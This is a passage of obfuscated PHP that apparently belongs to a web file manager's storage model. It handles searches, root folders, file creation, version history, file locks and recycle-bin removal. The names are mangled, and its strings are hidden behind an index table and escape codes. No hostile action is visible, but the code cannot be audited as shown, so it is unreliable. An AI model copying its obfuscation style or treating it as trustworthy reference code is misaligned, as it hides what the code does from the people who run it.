$¼¨±Ü®î); $¼¨±Ü®î = $Š½å[479] . str_replace($Š½å[50], $Š½å[480], $¼¨±Ü®î); $µæ¦¤… = $ªò¾ı»Ì[$Š½å[32]]; unset($ªò¾ı»Ì[$Š½å[32]]); foreach ($ªò¾ı»Ì as $€ò²Ğ· => $›ó²©«) { $Ç¦ĞàôÀ[$Š½å[479] . $€ò²Ğ·] = $›ó²©«; } foreach ($µæ¦¤… as $ûıÔ¿„) { $Ç¦ĞàôÀ[] = array($Š½å[484] => $ûıÔ¿„, $Š½å[1043] => $Š½å[1986], array($Š½å[2154] => $ûıÔ¿„, $Š½å[2155] => array($Š½å[7], array($Š½å[506], $Š½å[505])))); } $this->join($ªÖĞ¯ì); $ªò¾ı»Ì = $Ç¦ĞàôÀ; } private function _parseSearchWhere($ª˜º—ÚÕ) { $‰ŒŞÄÂä =& $_SERVER[³½¬ÚË¯]; $‰Å¯›ù = array(); if (isset($ª˜º—ÚÕ[$‰ŒŞÄÂä[796]]) && $ª˜º—ÚÕ[$‰ŒŞÄÂä[796]]) { $‰Å¯›ù[$‰ŒŞÄÂä[85]] = array($‰ŒŞÄÂä[2156], $ª˜º—ÚÕ[$‰ŒŞÄÂä[796]]); } if (isset($ª˜º—ÚÕ[$‰ŒŞÄÂä[797]]) && $ª˜º—ÚÕ[$‰ŒŞÄÂä[797]]) { $â‚•şñè = array($‰ŒŞÄÂä[2157], $ª˜º—ÚÕ[$‰ŒŞÄÂä[797]]); if ($‰Å¯›ù[$‰ŒŞÄÂä[85]]) { $‰Å¯›ù[$‰ŒŞÄÂä[85]] = array($‰Å¯›ù[$‰ŒŞÄÂä[85]], $â‚•şñè, $‰ŒŞÄÂä[2158]); } else { $‰Å¯›ù[$‰ŒŞÄÂä[85]] = $â‚•şñè; } } if (isset($ª˜º—ÚÕ[$‰ŒŞÄÂä[2150]]) && $ª˜º—ÚÕ[$‰ŒŞÄÂä[2150]] > 0) { $‰Å¯›ù[$‰ŒŞÄÂä[76]] = array($‰ŒŞÄÂä[2156], $ª˜º—ÚÕ[$‰ŒŞÄÂä[2150]]); } if (isset($ª˜º—ÚÕ[$‰ŒŞÄÂä[2151]]) && $ª˜º—ÚÕ[$‰ŒŞÄÂä[2151]]) { $â‚•şñè = array($‰ŒŞÄÂä[2157], $ª˜º—ÚÕ[$‰ŒŞÄÂä[2151]]); if ($‰Å¯›ù[$‰ŒŞÄÂä[76]]) { $‰Å¯›ù[$‰ŒŞÄÂä[76]] = array($‰Å¯›ù[$‰ŒŞÄÂä[76]], $â‚•şñè, $‰ŒŞÄÂä[2158]); } else { $‰Å¯›ù[$‰ŒŞÄÂä[76]] = $â‚•şñè; } } if (isset($ª˜º—ÚÕ[$‰ŒŞÄÂä[631]]) && $ª˜º—ÚÕ[$‰ŒŞÄÂä[631]]) { $‰Å¯›ù[] = array($‰ŒŞÄÂä[497] => $ª˜º—ÚÕ[$‰ŒŞÄÂä[631]], $‰ŒŞÄÂä[495] => $ª˜º—ÚÕ[$‰ŒŞÄÂä[631]], $‰ŒŞÄÂä[1043] => $‰ŒŞÄÂä[1986]); } if (isset($ª˜º—ÚÕ[$‰ŒŞÄÂä[454]]) && $ª˜º—ÚÕ[$‰ŒŞÄÂä[454]]) { $“ÖÈë³‹ = $ª˜º—ÚÕ[$‰ŒŞÄÂä[454]]; if ($“ÖÈë³‹ == $‰ŒŞÄÂä[75]) { $‰Å¯›ù[$‰ŒŞÄÂä[453]] = 1; } else { if ($“ÖÈë³‹ == $‰ŒŞÄÂä[2159]) { $‰Å¯›ù[$‰ŒŞÄÂä[453]] = 0; } else { if ($“ÖÈë³‹) { $“ÖÈë³‹ = is_array($“ÖÈë³‹) ? $“ÖÈë³‹ : explode($‰ŒŞÄÂä[50], $“ÖÈë³‹); $‰Å¯›ù[$‰ŒŞÄÂä[454]] = array($‰ŒŞÄÂä[460], $“ÖÈë³‹); $‰Å¯›ù[$‰ŒŞÄÂä[453]] = 0; } } } } $this->_parseSearchParent($ª˜º—ÚÕ, $‰Å¯›ù); if (isset($ª˜º—ÚÕ[$‰ŒŞÄÂä[1982]]) && trim($ª˜º—ÚÕ[$‰ŒŞÄÂä[1982]])) { $¦“Ùì”¯ = trim($ª˜º—ÚÕ[$‰ŒŞÄÂä[1982]]); $£³¼Ôˆ¡ = explode($‰ŒŞÄÂä[53], $¦“Ùì”¯); if (strlen($¦“Ùì”¯) > 2 && (substr($¦“Ùì”¯, 0, 1) == $‰ŒŞÄÂä[118] && substr($¦“Ùì”¯, -1) == $‰ŒŞÄÂä[118]) || substr($¦“Ùì”¯, 0, 1) == $‰ŒŞÄÂä[58] && substr($¦“Ùì”¯, -1) == $‰ŒŞÄÂä[58]) { $¦“Ùì”¯ = substr($¦“Ùì”¯, 1, -1); $£³¼Ôˆ¡ = array($¦“Ùì”¯); } $‰Å¯›ù[$‰ŒŞÄÂä[32]] = array(array($‰ŒŞÄÂä[581], $‰ŒŞÄÂä[1984] . $¦“Ùì”¯ . $‰ŒŞÄÂä[1984])); if (count($£³¼Ôˆ¡) > 1) { $‰Å¯›ù[$‰ŒŞÄÂä[32]] = array(); foreach ($£³¼Ôˆ¡ as $ô·çåÒ) { if (!trim($ô·çåÒ)) { continue; } $‰Å¯›ù[$‰ŒŞÄÂä[32]][] = array($‰ŒŞÄÂä[581], $‰ŒŞÄÂä[1984] . trim($ô·çåÒ) . $‰ŒŞÄÂä[1984]); } } } return $‰Å¯›ù; } private function _parseSearchParent($ê ı¥‡, &$ìœ˜Ÿæí) { $ÍµÑŸ× =& $_SERVER[³½¬ÚË¯]; if (!isset($ê ı¥‡[$ÍµÑŸ×[180]]) || !$ê ı¥‡[$ÍµÑŸ×[180]]) { return; } $ÎÒí¯Äï = $this->pathInfo($ê ı¥‡[$ÍµÑŸ×[180]]); $Ôõ‚ãÏ¦ = $ÎÒí¯Äï[$ÍµÑŸ×[180]] . $ÍµÑŸ×[12] === $ÍµÑŸ×[212]; $¿Úöñ£© = $ÎÒí¯Äï[$ÍµÑŸ×[178]] == $ÍµÑŸ×[548]; if ($ÎÒí¯Äï[$ÍµÑŸ×[565]] == $ÍµÑŸ×[566]) { $©òƒ„Ş = $this->sourceInfo($ê ı¥‡[$ÍµÑŸ×[180]]); $ÎÒí¯Äï[$ÍµÑŸ×[554]] = $©òƒ„Ş[$ÍµÑŸ×[554]]; } $ìœ˜Ÿæí[$ÍµÑŸ×[621]] = array($ÍµÑŸ×[581], $ÎÒí¯Äï[$ÍµÑŸ×[554]] . $ê ı¥‡[$ÍµÑŸ×[180]] . $ÍµÑŸ×[582]); $ãÉ“‡šæ = isset($ê ı¥‡[$ÍµÑŸ×[1847]]) && in_array($ÍµÑŸ×[548], $ê ı¥‡[$ÍµÑŸ×[1847]]); if (!$ãÉ“‡šæ || !$¿Úöñ£© || !$Ôõ‚ãÏ¦ || !$ÎÒí¯Äï[$ÍµÑŸ×[455]]) { return; } if (!AuthModel::authCheckRoot($ÎÒí¯Äï[$ÍµÑŸ×[455]][$ÍµÑŸ×[456]])) { return; } $Íï‚Í–æ = $ÎÒí¯Äï[$ÍµÑŸ×[539]] . $ÍµÑŸ×[12]; if ($Íï‚Í–æ == $ÍµÑŸ×[88]) { unset($ìœ˜Ÿæí[$ÍµÑŸ×[621]]); $ìœ˜Ÿæí[$ÍµÑŸ×[178]] = self::TYPE_GROUP; return; } $Ö¡áãÇÔ = Model($ÍµÑŸ×[555])->groupChildrenAll($Íï‚Í–æ); $—ñ±ü‰» = count($Ö¡áãÇÔ); if ($—ñ±ü‰» <= 1) { return; } $ò ÌÔÅÜ = array($ÍµÑŸ×[180] => 0, $ÍµÑŸ×[178] => self::TYPE_GROUP, $ÍµÑŸ×[539] => array($ÍµÑŸ×[7], $Ö¡áãÇÔ)); $„Ô•¦Š° = $this->field($ÍµÑŸ×[2160])->where($ò ÌÔÅÜ)->limit($—ñ±ü‰»)->select(); $ìœ˜Ÿæí[$ÍµÑŸ×[621]] = array(); foreach ($„Ô•¦Š° as $·üÇãƒ) { $ìœ˜Ÿæí[$ÍµÑŸ×[621]][] = array($ÍµÑŸ×[581], $ÍµÑŸ×[564] . $·üÇãƒ[$ÍµÑŸ×[181]] . $ÍµÑŸ×[582]); } $ìœ˜Ÿæí[$ÍµÑŸ×[621]][] = $ÍµÑŸ×[1986]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($¸øÇŞ…´) { $óˆ¯è´ =& $_SERVER[³½¬ÚË¯]; $œíÑ™»í = Model($óˆ¯è´[547])->where(array($óˆ¯è´[1681] => $¸øÇŞ…´))->find(); $®†·É×† = $this->_mkdirRoot(SourceModel::TYPE_USER, $¸øÇŞ…´, $œíÑ™»í[$óˆ¯è´[32]]); $this->userDesktopAdd($®†·É×†); return $®†·É×†; } public function userDesktopAdd($å‚á“¢Ë) { $”¿ÚÌØ =& $_SERVER[³½¬ÚË¯]; $”É Åä = LNG($”¿ÚÌØ[2161]); $ô®™ÜìŠ = $this->mkdir($å‚á“¢Ë, $”É Åä); $this->metaSet($ô®™ÜìŠ, $”¿ÚÌØ[2162], $”¿ÚÌØ[88]); $this->metaSet($å‚á“¢Ë, $”¿ÚÌØ[2163], $ô®™ÜìŠ); } public function userPathSafeAdd($ÄˆÜ£€¤) { $½ó¦Æè =& $_SERVER[³½¬ÚË¯]; $ÊÏ§ê¾¡ = Model($½ó¦Æè[547])->getInfoFull($ÄˆÜ£€¤); if (!$ÊÏ§ê¾¡) { return !1; } if (_get($ÊÏ§ê¾¡, $½ó¦Æè[569])) { return $ÊÏ§ê¾¡[$½ó¦Æè[507]][$½ó¦Æè[2164]]; } $¹ë ¢š = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÄˆÜ£€¤, $½ó¦Æè[2165], $½ó¦Æè[474]); Model($½ó¦Æè[547])->metaSet($ÄˆÜ£€¤, $½ó¦Æè[2164], $¹ë ¢š); $this->metaSet($¹ë ¢š, $½ó¦Æè[2166], $ÄˆÜ£€¤); return $¹ë ¢š; } public function groupRootAdd($¯¶ù‹–) { $·„”àßâ =& $_SERVER[³½¬ÚË¯]; $é§‡ê›‹ = Model($·„”àßâ[555])->where(array($·„”àßâ[1976] => $¯¶ù‹–))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¯¶ù‹–, $é§‡ê›‹[$·„”àßâ[32]]); } public function systemRootPathAdd($Î»„´‚µ) { if ($Î»„´‚µ != $_SERVER[³½¬ÚË¯][575]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Î»„´‚µ); } public function userRootRemove($å¡ôÌ¿€) { $¿ªÙè… = $this->targetSourceRoot(SourceModel::TYPE_USER, $å¡ôÌ¿€, !0); foreach ($¿ªÙè… as $ûÓšÊØ) { if (!$ûÓšÊØ) { continue; } $this->remove($ûÓšÊØ[$_SERVER[³½¬ÚË¯][181]], !1); } } public function groupRootRemove($¢è¡ôÌ“) { $ÉÈæ¤İ’ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $¢è¡ôÌ“); if (!$ÉÈæ¤İ’) { return; } $this->remove($ÉÈæ¤İ’[$_SERVER[³½¬ÚË¯][181]], !1); } private function _mkdirRoot($Ÿ‡´¾×–, $¢âÏãÚº, $Áë›œù‹, $ÎÄÀÀÄ„ = '') { $€òìùÊò =& $_SERVER[³½¬ÚË¯]; $åÉ€êó— = defined($€òìùÊò[2109]) ? USER_ID : 0; $‘Âë§’ş = array($€òìùÊò[445] => 0, $€òìùÊò[617] => $Ÿ‡´¾×–, $€òìùÊò[618] => $¢âÏãÚº, $€òìùÊò[615] => 1, $€òìùÊò[619] => $åÉ€êó—, $€òìùÊò[620] => $åÉ€êó—, $€òìùÊò[616] => $ÎÄÀÀÄ„, $€òìùÊò[621] => $€òìùÊò[564], $€òìùÊò[472] => 0, $€òìùÊò[586] => 0, $€òìùÊò[510] => 0, $€òìùÊò[622] => $€òìùÊò[12]); if ($ôì²¶Ê = $this->where($‘Âë§’ş)->find()) { return $ôì²¶Ê[$€òìùÊò[181]]; } $â„ŠÈ¼ = "\x4d\x6f\144\145\x6c\123\x6f\x75\162\143\x65\x2e\x6d\x6b\x64\151\162\x52\157\157\x74\56{$Ÿ‡´¾×–}\x2e{$¢âÏãÚº}\56" . $Áë›œù‹; CacheLock::lock($â„ŠÈ¼); $‘Âë§’ş[$€òìùÊò[32]] = $Áë›œù‹; $áñÎó†Ê = $this->add($‘Âë§’ş); $æ¿¦£© = array($€òìùÊò[623] => short_id($áñÎó†Ê)); $this->where(array($€òìùÊò[459] => $áñÎó†Ê))->save($æ¿¦£©); CacheLock::unlock($â„ŠÈ¼); return $áñÎó†Ê; } private function targetSourceRoot($¨å˜©, $¿öõÑÁ¦, $Æ›”¶„€ = false) { $ø‹ôÖû =& $_SERVER[³½¬ÚË¯]; $ÂáæÏÎñ = array($ø‹ôÖû[445] => 0, $ø‹ôÖû[617] => $¨å˜©, $ø‹ôÖû[618] => $¿öõÑÁ¦); if ($Æ›”¶„€) { $“›ç = $this->where($ÂáæÏÎñ)->select(); return $“›ç ? $“›ç : array(); } $åÜ‹©ÚÈ = $this->where($ÂáæÏÎñ)->find(); return $åÜ‹©ÚÈ ? $åÜ‹©ÚÈ : array(); } public function sourceRootGroup($íà–ô¨—) { $Œ˜õÆıİ =& $_SERVER[³½¬ÚË¯]; if (is_string($íà–ô¨—)) { $íà–ô¨— = array($íà–ô¨—); } $ş¡‰Ÿ°ı = $this->listSourceRoot(SourceModel::TYPE_GROUP, $íà–ô¨—, $Œ˜õÆıİ[203]); $§“¨®µÁ = array($Œ˜õÆıİ[413] => $ş¡‰Ÿ°ı, $Œ˜õÆıİ[410] => array($Œ˜õÆıİ[794] => count($íà–ô¨—))); $this->_listDataApply($§“¨®µÁ[$Œ˜õÆıİ[413]]); $this->_listMake($§“¨®µÁ); return array_to_keyvalue($§“¨®µÁ[$Œ˜õÆıİ[82]], $Œ˜õÆıİ[539]); } public function mkfile($š¢ŠÉÌ”, $Ïæ¥¡Ùµ, $ªÚ·õÄ– = '', $Óô³ÙŠŸ = REPEAT_RENAME) { $É¡†”„² =& $_SERVER[³½¬ÚË¯]; $²˜Åã× = Model($É¡†”„²[643])->addFileByContent($ªÚ·õÄ–, $Ïæ¥¡Ùµ); return $this->_createFileCall($š¢ŠÉÌ”, $Ïæ¥¡Ùµ, $²˜Åã×, $Óô³ÙŠŸ, $É¡†”„²[1385]); } public function addFile($ê£¨ğ©, $¶ƒëÆéœ, $ÅÓÈ€Óò, $óÉõÔË = false, $ÑÏØßÍ = REPEAT_RENAME) { $§Í÷»ÁÑ = Model($_SERVER[³½¬ÚË¯][643])->addFile($¶ƒëÆéœ, $ÅÓÈ€Óò, $óÉõÔË); return $this->_createFileCall($ê£¨ğ©, $ÅÓÈ€Óò, $§Í÷»ÁÑ, $ÑÏØßÍ); } public function addFileByFileID($’œÏª»Ñ, $ÅŠ‰ï£Š, $ä­™ó—ã, $Ø§‡ëÉã = REPEAT_RENAME) { $¼şöİœ¤ =& $_SERVER[³½¬ÚË¯]; $®œ­µÔç = Model($¼şöİœ¤[643])->find($ÅŠ‰ï£Š); Model($¼şöİœ¤[643])->linkAdd($ÅŠ‰ï£Š); return $this->_createFileCall($’œÏª»Ñ, $ä­™ó—ã, $®œ­µÔç, $Ø§‡ëÉã); } public function addFileByRemote($Öî•á², $¬ÏÄ­¦ë, $Ø¶ï§ä©, $ä€ı“’° = array(), $Š©è«Ø´ = REPEAT_RENAME) { $€•»È–© = Model($_SERVER[³½¬ÚË¯][643])->addFileByRemote($¬ÏÄ­¦ë, $Ø¶ï§ä©, $ä€ı“’°); return $this->_createFileCall($Öî•á², $Ø¶ï§ä©, $€•»È–©, $Š©è«Ø´); } private function _createFileCall($û ‚›–, $ıÚÀ©ºÔ, $·•“ù¨, $½È¯¡áµ, $ÉÈ­òóé = "\x75\160\x6c\x6f\141\144") { $õâœÙÌà =& $_SERVER[³½¬ÚË¯]; $èĞ×¢Ÿ = !1; $this->setMasterDB(); $this->lockWriteStart($û ‚›–, $ıÚÀ©ºÔ); $ß¡”­‡ = $this->fileNameExist($û ‚›–, $ıÚÀ©ºÔ); $ŸşãåŒµ = $this->_createFile($û ‚›–, $ıÚÀ©ºÔ, $·•“ù¨, $½È¯¡áµ, $èĞ×¢Ÿ); if (!$èĞ×¢Ÿ) { Model($õâœÙÌà[512])->remove($·•“ù¨[$õâœÙÌà[509]]); } if ($èĞ×¢Ÿ && $ŸşãåŒµ && $ŸşãåŒµ != $ß¡”­‡) { Model($õâœÙÌà[2134])->eventCreate($ŸşãåŒµ, $ÉÈ­òóé); } $this->lockWriteEnd($û ‚›–, $ıÚÀ©ºÔ); return $ŸşãåŒµ; } public function mkdir($—’ÄÛ¹, $™ıÑÎ¤½, $‡ıä«“È = REPEAT_SKIP) { $€Â›ÄñÃ =& $_SERVER[³½¬ÚË¯]; $this->setMasterDB(); $¦Æ•¾ â = $this->sourceInfo($—’ÄÛ¹); if (!$¦Æ•¾ â) { return !1; } $this->lockWriteStart($—’ÄÛ¹, $™ıÑÎ¤½); if ($‡ıä«“È !== !1) { $§”ââÍ = $this->fileNameExist($—’ÄÛ¹, $™ıÑÎ¤½); if ($§”ââÍ && $‡ıä«“È != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($—’ÄÛ¹, $™ıÑÎ¤½); return $§”ââÍ; } $™ıÑÎ¤½ = $this->fileNameAuto($—’ÄÛ¹, $™ıÑÎ¤½, $‡ıä«“È); } $ş‰ÎëïÖ = array($€Â›ÄñÃ[615] => 1, $€Â›ÄñÃ[462] => $™ıÑÎ¤½, $€Â›ÄñÃ[616] => $€Â›ÄñÃ[12], $€Â›ÄñÃ[510] => 0, $€Â›ÄñÃ[586] => 0); $ßá÷‡öÏ = $this->_addSource($ş‰ÎëïÖ, $¦Æ•¾ â); Model($€Â›ÄñÃ[2134])->eventCreate($ßá÷‡öÏ, $€Â›ÄñÃ[1386]); $this->lockWriteEnd($—’ÄÛ¹, $™ıÑÎ¤½); return $ßá÷‡öÏ; } public function listSourceRoot($¹êÛ¶õ, $½À£¸şÈ, $£©ë£¡ = "\163\157\165\162\143\x65\111\x44\x2c\164\x61\x72\147\x65\164\111\x44\x2c\163\x69\172\x65") { $ëà…çç’ =& $_SERVER[³½¬ÚË¯]; $Ô‚¨³±î = $ëà…çç’[422]; $¢¡•Ş© = array(); $İä¿æ¥ = 1024 * 50; $İã‰ØÈ = is_array($İã‰ØÈ) ? $İã‰ØÈ : array(); $ëƒÁùã = count($½À£¸şÈ); $¬ıÚÕÑ‰ = $this->tablePrefix . $ëà…çç’[2167]; for ($û‘‡£ƒú = 0; $û‘‡£ƒú < $ëƒÁùã; $û‘‡£ƒú++) { $ş¶ôØµÉ = $½À£¸şÈ[$û‘‡£ƒú]; $Ô‚¨³±î .= "\x53\x45\x4c\x45\x43\x54\x20\52\40\x46\122\117\x4d\40\50\x53\105\x4c\105\103\x54\40{$£©ë£¡}\40\106\122\117\x4d\x20\140{$¬ıÚÕÑ‰}\x60\x20\x57\110\105\122\x45\40"; $Ô‚¨³±î .= "\x60\160\141\x72\145\x6e\x74\x49\104\140\75\x30\40\x41\x4e\x44\40\140\x74\141\162\x67\x65\164\111\104\140\75{$ş¶ôØµÉ}\40\101\116\104\x20\140\164\141\x72\147\x65\x74\x54\171\x70\145\140\x3d{$¹êÛ¶õ}\40\x61\156\144\x20\146\x69\154\145\x54\171\x70\x65\75\x27\47\40\154\x69\x6d\151\164\x20\x31\51\x20\x61\x73\x20\164\x62\137{$û‘‡£ƒú}\x20\125\116\x49\x4f\116\40\101\x4c\114\x20"; if ((strlen($Ô‚¨³±î) >= $İä¿æ¥ || $û‘‡£ƒú == $ëƒÁùã - 1) && $Ô‚¨³±î) { $Ô‚¨³±î = substr($Ô‚¨³±î, 0, -strlen($ëà…çç’[1081])); $†ü‰åÜÖ = $this->query($Ô‚¨³±î); $Ô‚¨³±î = $ëà…çç’[12]; $¢¡•Ş© = array_merge($¢¡•Ş©, $†ü‰åÜÖ); } } return $¢¡•Ş©; } private function _createFile($¨ ¤æ‡”, $ñ†ÎÖ‡, $÷ÉÁÆËş, $¼ä·¥œİ, &$¾´Ÿ—Œ) { $ü™©•èï =& $_SERVER[³½¬ÚË¯]; $­òëé” = $this->sourceInfo($¨ ¤æ‡”); if (!$÷ÉÁÆËş || !$­òëé”) { return !1; } if ($¼ä·¥œİ !== !1) { $Âˆ”ÜÔÕ = $this->fileNameExist($¨ ¤æ‡”, $ñ†ÎÖ‡); } $¾´Ÿ—Œ = !0; if ($¼ä·¥œİ && $Âˆ”ÜÔÕ) { if ($¼ä·¥œİ == REPEAT_SKIP) { $¾´Ÿ—Œ = !1; return $Âˆ”ÜÔÕ; } else { if ($¼ä·¥œİ == REPEAT_REPLACE) { $Şë¥ô€ú = $this->sourceInfo($Âˆ”ÜÔÕ); $õãœ³®ã = $this->fileHistory($Şë¥ô€ú, $÷ÉÁÆËş[$ü™©•èï[509]], $÷ÉÁÆËş[$ü™©•èï[76]]); if (!$õãœ³®ã) { $¾´Ÿ—Œ = !1; } else { $this->folderSizeReset($¨ ¤æ‡”); } return $Âˆ”ÜÔÕ; } else { $ñ†ÎÖ‡ = $this->fileNameAuto($¨ ¤æ‡”, $ñ†ÎÖ‡, $¼ä·¥œİ, !1); } } } $ÙÇ—Ğ‘Ş = array($ü™©•èï[615] => 0, $ü™©•èï[462] => $ñ†ÎÖ‡, $ü™©•èï[616] => substr(get_path_ext($ñ†ÎÖ‡), 0, 10), $ü™©•èï[510] => $÷ÉÁÆËş[$ü™©•èï[509]], $ü™©•èï[586] => $÷ÉÁÆËş[$ü™©•èï[76]]); $„„­òÅ• = $this->_addSource($ÙÇ—Ğ‘Ş, $­òëé”); $this->folderSizeReset($¨ ¤æ‡”, intval($ÙÇ—Ğ‘Ş[$ü™©•èï[76]])); return $„„­òÅ•; } protected function fileHistory($æ¶Ô§”±, $ˆ÷ªá­, $¡Üş»¦ë) { $¿œÉıš­ =& $_SERVER[³½¬ÚË¯]; if ($æ¶Ô§”±[$¿œÉıš­[509]] == $ˆ÷ªá­) { return !1; } $this->checkLock($æ¶Ô§”±[$¿œÉıš­[181]], $ˆ÷ªá­); Model($¿œÉıš­[2168])->addHistory($æ¶Ô§”±); $¼éÑâî = array($¿œÉıš­[620] => USER_ID, $¿œÉıš­[466] => time(), $¿œÉıš­[509] => $ˆ÷ªá­, $¿œÉıš­[76] => $¡Üş»¦ë); $this->where(array($¿œÉıš­[459] => $æ¶Ô§”±[$¿œÉıš­[181]]))->save($¼éÑâî); $this->sourceCacheClear($æ¶Ô§”±[$¿œÉıš­[181]]); return !0; } public function checkLock($º‡É´˜‡, $üéç±³) { $À€Çñå¨ =& $_SERVER[³½¬ÚË¯]; $ò·ŞäØ˜ = $this->pathInfo($º‡É´˜‡); if (!$this->fileIsLock($ò·ŞäØ˜, !0)) { return; } $‚Â‰ğû = Session::get($À€Çñå¨[2169]); $ş¤À²æ = substr($ò·ŞäØ˜[$À€Çñå¨[32]], 0, -1 - strlen($ò·ŞäØ˜[$À€Çñå¨[175]])) . $À€Çñå¨[1251] . $‚Â‰ğû . $À€Çñå¨[10] . $ò·ŞäØ˜[$À€Çñå¨[175]]; $“Î¤Ëğˆ = Model($À€Çñå¨[643])->find($üéç±³); $this->_createFileCall($ò·ŞäØ˜[$À€Çñå¨[180]], $ş¤À²æ, $“Î¤Ëğˆ, REPEAT_REPLACE, $À€Çñå¨[1385]); $®òÏ¢…ç = $ò·ŞäØ˜[$À€Çñå¨[507]][$À€Çñå¨[579]]; $¹×ö¬ê· = $®òÏ¢…ç[$À€Çñå¨[2170]] ? $®òÏ¢…ç[$À€Çñå¨[2170]] : $®òÏ¢…ç[$À€Çñå¨[32]]; show_json(LNG($À€Çñå¨[2171]) . $À€Çñå¨[2172] . LNG($À€Çñå¨[2173]) . $À€Çñå¨[2174] . $¹×ö¬ê· . $À€Çñå¨[2175], !1); } public function fileIsLock($”íÑ«çÃ, $ª¢°…× = false) { $ÂòØ¦å˜ =& $_SERVER[³½¬ÚË¯]; if (!isset($”íÑ«çÃ[$ÂòØ¦å˜[507]]) || !$”íÑ«çÃ[$ÂòØ¦å˜[507]][$ÂòØ¦å˜[576]]) { return !1; } if ($”íÑ«çÃ[$ÂòØ¦å˜[507]][$ÂòØ¦å˜[576]] != USER_ID) { return !0; } $®ìÎ°Ğ˜ = $GLOBALS[$ÂòØ¦å˜[6]][$ÂòØ¦å˜[89]][$ÂòØ¦å˜[577]]; if ($”íÑ«çÃ[$ÂòØ¦å˜[507]][$ÂòØ¦å˜[578]] <= time() - $®ìÎ°Ğ˜) { $this->metaSet($”íÑ«çÃ[$ÂòØ¦å˜[181]], $ÂòØ¦å˜[576], null); $this->metaSet($”íÑ«çÃ[$ÂòØ¦å˜[181]], $ÂòØ¦å˜[578], null); } if ($ª¢°…×) { $this->metaSet($”íÑ«çÃ[$ÂòØ¦å˜[181]], $ÂòØ¦å˜[578], time()); } return !1; } private function _addSource($ÈˆˆÉòò, $ÒØ…Õ¼‰) { $¶æ¬Àï  =& $_SERVER[³½¬ÚË¯]; $İäÛ×¸Ü = defined($¶æ¬Àï [2109]) ? USER_ID : 0; $œøÍËÍŠ = array($¶æ¬Àï [617] => $ÒØ…Õ¼‰[$¶æ¬Àï [178]], $¶æ¬Àï [618] => $ÒØ…Õ¼‰[$¶æ¬Àï [539]], $¶æ¬Àï [619] => $İäÛ×¸Ü, $¶æ¬Àï [620] => $İäÛ×¸Ü, $¶æ¬Àï [445] => $ÒØ…Õ¼‰[$¶æ¬Àï [181]], $¶æ¬Àï [621] => $ÒØ…Õ¼‰[$¶æ¬Àï [554]] . $ÒØ…Õ¼‰[$¶æ¬Àï [181]] . $¶æ¬Àï [50], $¶æ¬Àï [472] => 0, $¶æ¬Àï [622] => $¶æ¬Àï [12]); $ÈˆˆÉòò = array_merge($œøÍËÍŠ, $ÈˆˆÉòò); $this->updateModifyTime($ÈˆˆÉòò[$¶æ¬Àï [180]]); $ÓÌÆË‡ = $¶æ¬Àï [2176] . $ÒØ…Õ¼‰[$¶æ¬Àï [181]]; if (isset(self::$cacheChildList[$ÓÌÆË‡])) { unset(self::$cacheChildList[$ÓÌÆË‡]); } static $ç èÄì® = false; if (!$ç èÄì®) { Hook::trigger($¶æ¬Àï [605], $ÈˆˆÉòò); $ç èÄì® = !0; } $šïâø¾ë = $this->add($ÈˆˆÉòò); $ÁÖÎ¥ÏØ = array($¶æ¬Àï [623] => short_id($šïâø¾ë)); $this->where(array($¶æ¬Àï [459] => $šïâø¾ë))->save($ÁÖÎ¥ÏØ); $this->setNamePinyin($šïâø¾ë, $ÈˆˆÉòò[$¶æ¬Àï [32]]); return $šïâø¾ë; } public function remove($ö¢ÜÇôì, $âº•úë© = true) { $ÛÊßºŒ‚ =& $_SERVER[³½¬ÚË¯]; $³ËÖ»´ô = $this->sourceInfo($ö¢ÜÇôì); $ó®‚ûşú = intval($³ËÖ»´ô[$ÛÊßºŒ‚[178]]) === self::TYPE_SYSTEM; $ÆÚÉÏŒŒ = Model($ÛÊßºŒ‚[476])->get($ÛÊßºŒ‚[2177]) == $ÛÊßºŒ‚[88]; if ($ó®‚ûşú || $âº•úë© || !$ÆÚÉÏŒŒ) { return $this->removeNow($ö¢ÜÇôì, $âº•úë©); } $¸À–°üÏ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $½Ã‡„üÜ = $³ËÖ»´ô[$ÛÊßºŒ‚[178]] == self::TYPE_USER ? $ÛÊßºŒ‚[631] : $ÛÊßºŒ‚[548]; if ($½Ã‡„üÜ == $ÛÊßºŒ‚[631]) { $‰Í‘‰Öû = Model($ÛÊßºŒ‚[547])->getInfo($³ËÖ»´ô[$ÛÊßºŒ‚[539]]); $Æ®Ãˆ‰ = !empty($‰Í‘‰Öû[$ÛÊßºŒ‚[2170]]) ? $‰Í‘‰Öû[$ÛÊßºŒ‚[2170]] : $‰Í‘‰Öû[$ÛÊßºŒ‚[32]]; $Æ®Ãˆ‰ = $ÛÊßºŒ‚[304] . $Æ®Ãˆ‰ . $ÛÊßºŒ‚[2178] . $³ËÖ»´ô[$ÛÊßºŒ‚[539]]; } else { $‰Í‘‰Öû = Model($ÛÊßºŒ‚[555])->getInfo($³ËÖ»´ô[$ÛÊßºŒ‚[539]]); $Æ®Ãˆ‰ = _get($‰Í‘‰Öû, $ÛÊßºŒ‚[32]); $Æ®Ãˆ‰ = $ÛÊßºŒ‚[163] . $Æ®Ãˆ‰ . $ÛÊßºŒ‚[2179] . $³ËÖ»´ô[$ÛÊßºŒ‚[539]]; } $°¾ùã¯ö = $ÛÊßºŒ‚[2180] . md5($Æ®Ãˆ‰); CacheLock::lock($°¾ùã¯ö); $ïÛ»«Ç§ = $this->fileNameExist($¸À–°üÏ, $Æ®Ãˆ‰); if (!$ïÛ»«Ç§) { $ïÛ»«Ç§ = $this->mkdir($¸À–°üÏ, $Æ®Ãˆ‰, REPEAT_SKIP); $this->metaSet($ïÛ»«Ç§, $ÛÊßºŒ‚[2181], $½Ã‡„üÜ); $this->metaSet($ïÛ»«Ç§, $ÛÊßºŒ‚[2182], $³ËÖ»´ô[$ÛÊßºŒ‚[539]]); if ($³ËÖ»´ô[$ÛÊßºŒ‚[180]] != 0) { $this->metaSet($ïÛ»«Ç§, $ÛÊßºŒ‚[2183], _get($‰Í‘‰Öû, $ÛÊßºŒ‚[2184])); } } CacheLock::unlock($°¾ùã¯ö); $this->metaSet($ö¢ÜÇôì, $ÛÊßºŒ‚[2185], $³ËÖ»´ô[$ÛÊßºŒ‚[180]]); 